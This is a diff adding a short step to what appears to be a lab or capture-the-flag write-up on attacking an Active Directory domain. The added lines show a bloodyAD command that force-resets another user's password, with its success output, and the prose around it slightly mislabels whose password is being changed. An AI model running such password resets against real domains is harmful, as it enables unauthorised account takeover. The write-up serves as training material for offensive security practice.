@@ -664,5 +664,12 @@ bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.wills -p 'Passwor
 First ill change the password for `noah.sanders` 
 
 ```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u noah.sanders -p 'Password123!' set password 'steve.miller' 'Password123!'
+[+] Password changed successfully!
+```
+
+Then ill change the password for `steve.miller` 
+
+```python
 
 ```
